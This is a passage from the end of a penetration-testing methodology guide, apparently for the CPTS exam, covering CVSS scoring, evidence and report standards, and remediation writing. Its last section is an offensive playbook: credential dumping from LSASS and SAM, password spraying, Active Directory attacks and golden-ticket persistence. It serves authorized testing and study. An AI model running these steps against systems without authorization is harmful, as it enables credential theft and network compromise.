- Unauth RCE on internet-facing service: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical
- Authenticated RCE:                     AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8 High
- DCSync as DA:                          AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H = 9.1 Critical
- IDOR reading other user's data:        AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5 Medium
- Stored XSS:                            AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N = 5.4 Medium
- Reflected XSS:                         AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N = 6.1 Medium
- LFI (read sensitive files):            AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5 Medium
- Default creds on admin panel:          AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical

Calculator: https://www.first.org/cvss/calculator/3.1
```

## 12.3 - Evidence Standards (per finding)

Each finding needs:
1. **Command executed** — full syntax, copy-paste-able
2. **Output / screenshot** — terminal showing target IP/hostname in window title or prompt
3. **Timestamp** — when finding was confirmed
4. **Affected asset** — IP + hostname + role (DC / file server / etc.)
5. **Reproduction steps** — numbered, runnable by a third party with only the report

Bad evidence:
- Truncated output (cut off mid-line)
- Screenshot of just an alert box with no URL/host context
- "I got a shell" with no `whoami` / `hostname` / `id` proof
- Hand-typed transcript (rewrite of what happened)

Good evidence:
- Terminal screenshot: window title shows `192.168.1.50`, prompt shows `root@target:#`, command + output visible, timestamp in scrollback
- Burp request + response pair, both screens
- Diff of `before` and `after` state (added user, modified file, dumped hash)

## 12.4 - Report Structure

```
1. Cover Page
   ├── Client name, project name, version, date, classification
   └── Author + reviewer names

2. Executive Summary (non-technical, 1 page)
   ├── Engagement scope (what was tested, dates)
   ├── Highest-impact findings (3-5 bullets, business risk language)
   ├── Risk distribution chart (Critical/High/Medium/Low counts)
   └── Strategic recommendations (3-5 bullets)

3. Scope & Methodology
   ├── In-scope assets (IPs, domains, applications)
   ├── Out-of-scope (explicit)
   ├── Testing window (start/end timestamps)
   ├── Methodology framework reference (PTES, OWASP, NIST SP 800-115)
   └── Limitations / constraints

4. Attack Narrative (chronological)
   ├── Initial foothold
   ├── Each privilege escalation step
   ├── Lateral movement chain
   └── Final compromise (DA / crown jewel access)

5. Technical Findings (one per vulnerability, repeated)
   For each finding:
   ├── Title (descriptive: "Unauthenticated SQL Injection in /search Parameter")
   ├── Severity (CVSS 3.1 score + vector string)
   ├── CWE classification
   ├── Affected asset(s)
   ├── Description (technical explanation of the issue)
   ├── Impact (what an attacker gains — business + technical)
   ├── Evidence (commands + screenshots, numbered)
   ├── Reproduction steps (1, 2, 3 — runnable)
   ├── Remediation (specific, not "patch the software")
   └── References (CVE, CWE, vendor advisory, OWASP)

6. Appendices
   ├── A: Host Inventory (IP/hostname/OS/services/access level)
   ├── B: Credential Inventory (user, cleartext or hash, source, where reused)
   ├── C: Exploitation Timeline (timestamped chronology of all actions)
   ├── D: Tools Used (with versions)
   ├── E: Raw Scan Data (nmap, BloodHound exports)
   └── F: References + further reading
```

## 12.5 - Severity Decision Guide

```
Critical (9.0+):
- Unauthenticated RCE on production system
- Full domain compromise (DA via DCSync, golden ticket)
- Cleartext credentials of privileged accounts exposed network-wide
- Crown jewel data access (PII, financial records, source code)

High (7.0-8.9):
- Authenticated RCE
- Privilege escalation local → admin / root
- Sensitive file read (passwd, SAM, configs with creds)
- Persistent backdoor / scheduled task install
- AD ACL abuse leading to high-priv account compromise

Medium (4.0-6.9):
- Stored / Reflected XSS
- IDOR exposing PII of other users
- Limited LFI (no /etc/passwd, only app files)
- CSRF on sensitive actions
- Weak password policy / no MFA on critical app

Low (0.1-3.9):
- Information disclosure (version banners, internal IPs in headers)
- Missing security headers (HSTS, CSP, X-Frame-Options)
- Outdated software no exploitable CVE
- Self-XSS

Informational:
- Best-practice recommendations
- Hardening suggestions without active risk
```

## 12.6 - Remediation Patterns (write specific, not generic)

Bad: "Update to the latest version."
Good: "Upgrade Apache Tomcat from 9.0.30 to 9.0.85 or newer. Disable the `/manager` application
unless required. If required, restrict `tomcat-users.xml` to deny remote access and rotate
default credentials. Apply ALLOW from x.x.x.x in `context.xml` for management endpoints."

Bad: "Sanitize user input."
Good: "Replace the string concatenation in `search.php:42` with a parameterized query using
PDO prepared statements. Cast `$_GET['id']` to integer via `(int)` if the field is strictly
numeric. Add an allowlist regex `^[a-zA-Z0-9_-]+$` for the `sort` parameter."

Bad: "Implement strong passwords."
Good: "Enforce minimum 14-character passwords with complexity (Group Policy:
Computer Configuration > Policies > Windows Settings > Security Settings > Account Policies >
Password Policy). Enable Account Lockout after 5 failed attempts for 30 minutes. Deploy
Microsoft LAPS for local admin accounts so each host has a unique random password."

## 12.7 - Common Report Mistakes (kill these)

- No CVSS vector string (only the score) — reviewer can't verify
- Hostname / IP missing from screenshots
- "Could lead to" / "may allow" — write what you DID, not what you imagine
- Reusing the same screenshot for multiple findings
- Steps to Reproduce that skip a step ("login, then ...")
- Remediation that says "implement security best practices"
- Inconsistent severity (text says High, table says Medium)
- Findings out of scope (out-of-scope assets in the report)
- Spelling client name wrong (instant credibility loss)
- Tables not numbered, figures not captioned

## 12.8 - Pre-Submission Checklist

```
[ ] All in-scope assets covered (none missed)
[ ] No out-of-scope assets included
[ ] Every finding has: title, CVSS vector, evidence, repro steps, remediation
[ ] Executive summary is non-technical
[ ] Attack narrative tells the story chronologically
[ ] Appendix C timeline matches finding timestamps
[ ] Credential inventory complete (every cred found is listed)
[ ] No placeholder text ("TODO", "TBD", "lorem ipsum")
[ ] Page numbers, TOC, header/footer consistent
[ ] Client name spelled correctly throughout
[ ] PDF compiled, no broken images / missing fonts
[ ] File named per client convention (e.g., CLIENT_PT_v1.0_2026-MM-DD.pdf)
```

---

# ITERATIVE METHODOLOGY RULES

> Apply across every phase. After each new foothold, re-enter the loop.

## After EVERY New Foothold:
```
1. Stabilize shell (python3 -c 'import pty;pty.spawn("/bin/bash")')
2. Transfer tools (linpeas, winpeas, etc.)
3. Enumerate host fully (OS, kernel, services, creds, network)
4. Check for additional NICs → new subnets (pivot targets)
5. Check for domain membership → AD enumeration
6. Dump all credentials (SAM, LSASS, shadow, bash_history, configs)
7. Search for sensitive files (configs, backups, scripts with creds)
8. Check for other users' sessions → lateral movement targets
9. Re-spray all found creds against all discovered hosts
10. Re-run BloodHound with new account as owned node
11. RESTART methodology from Phase 1 on new host/subnet
```

## When Stuck:
```
General:
1. Re-read all scan output carefully — may have missed something
2. Check for non-standard ports (8080, 8443, 9090, etc.)
3. Try all found creds on ALL services (not just where found)
4. Check write access to shares → SCF/LNK file drop → capture hash
5. Re-run nmap with -sU (UDP) — SNMP, IPMI, TFTP, IKE often missed

AD-specific:
6. IPv6 attacks (mitm6 → relay LDAPS / ADCS) — see §9.1.6
7. LLMNR/NBT-NS poisoning (Responder)
8. Re-review BloodHound output — look for overlooked paths/ACL edges
9. Password spray season+year, company+year patterns
10. GPP/c-password in SYSVOL
11. Shadow Credentials / PKINIT (§9.8.4)
12. ADCS ESC1-ESC11 (§9.10) ← high-value, often overlooked
13. NoPac, PrintNightmare (if unpatched)
14. Coerced auth menu (§9.8.3b): PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce
15. LAPS / gMSA password reads (§9.3.3b)
16. Scheduled tasks running as SYSTEM with writable scripts
17. Cross-forest trust enumeration
```

## Key Decision Points:
```
Got creds?
├─ Spray against ALL services: SMB, WinRM, RDP, MSSQL, SSH, LDAP
├─ Run BloodHound + mark owned
├─ Kerberoast / AS-REP roast
├─ Check shares for sensitive data
└─ Try LAPS / gMSA reads

Got admin (local)?
├─ Dump SAM/LSASS/secrets
├─ Find DA sessions
├─ Token impersonation (potato attacks)
└─ Lateral move with same creds

Got DA / DC compromise?
├─ DCSync all hashes (esp. krbtgt)
├─ Golden/Silver ticket persistence
├─ ADCS golden cert persistence (§9.10.10)
├─ Trust exploitation (parent/cross-forest)
└─ Document everything for report
```

## Wordlists to Use:
```
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/*-passwords.txt
/usr/share/seclists/Usernames/*-usernames.txt
Custom: CeWL from target website + company name variations
Season passwords: Spring2024!, Summer2024!, Fall2024!, Winter2024!
Company passwords: Companyname1!, Companyname123!, Welcome1
```

---

*This methodology covers 100% of CPTS exam content. Follow decision trees iteratively. If one path fails, backtrack and try the next. Always enumerate before attacking. Document everything.*

---

*This methodology covers 100% of CPTS exam content. Follow decision trees iteratively. If one path fails, backtrack and try the next. Always enumerate before attacking. Document everything.*

**The exam tests methodology, not just tools. Understand WHY each step matters.**
